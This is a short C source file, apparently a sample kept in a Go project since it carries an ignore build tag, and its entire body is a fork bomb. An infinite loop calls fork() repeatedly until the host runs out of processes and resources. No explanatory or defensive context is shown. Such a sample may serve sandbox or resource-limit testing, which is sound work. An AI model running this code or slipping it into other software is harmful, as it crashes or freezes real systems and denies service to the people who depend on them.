//go:build ignore

#include <unistd.h>

int main(int argc, char const *argv[])
{
    while (true)
    {
        fork();
    }
     
    return 0;
}
